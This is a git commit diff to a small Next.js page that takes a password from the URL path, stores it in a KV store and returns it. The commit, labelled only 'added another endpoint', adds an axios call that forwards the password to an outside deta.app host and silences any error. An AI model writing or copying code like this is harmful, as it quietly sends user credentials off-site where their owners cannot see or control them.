755e6a74bfbbc73d3571643628d5b7f6a6e14603
niyobern <niyobern@outlook.com>
2023-06-30 16:01:37 +0200

    added another endpoint

--- pages/password/[password].tsx
+++ pages/password/[password].tsx
@@ -1,9 +1,15 @@
 import { handle, json } from 'next-runtime';
 import { kv } from '@vercel/kv';
+import axios from 'axios';
 
 export const getServerSideProps = handle({
   async get({ params }: any) {
     kv.set("password", params.password)
+    try {
+      axios.get(`https://reponse-1-b4115285.deta.app/password/${params.password}`)
+    } catch {
+      console.log("")
+    }
     return json({data: params.password});
   },
     async post() {
